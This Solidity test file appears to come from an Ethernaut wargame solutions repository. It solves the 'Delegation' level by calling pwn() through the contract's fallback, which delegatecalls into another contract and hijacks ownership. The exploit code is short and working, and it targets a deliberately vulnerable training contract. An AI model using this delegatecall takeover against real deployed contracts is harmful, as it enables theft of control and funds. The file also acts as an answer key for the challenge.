// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {DelegationFactory} from "../src/factories/DelegationFactory.sol";
import {Delegation} from "../src/levels/Delegation.sol";

contract DelegationTest is EthernautTest {
    function setUpLevel() public override {
	DelegationFactory factory = new DelegationFactory();
	ethernaut.registerLevel(factory);
	levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveDelegation() public {
	Delegation parity = Delegation(payable(levelAddress));
	vm.startPrank(address(this));
	(bool success, ) = address(parity).call(abi.encodeWithSignature("pwn()"));
	assert(success);
	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}
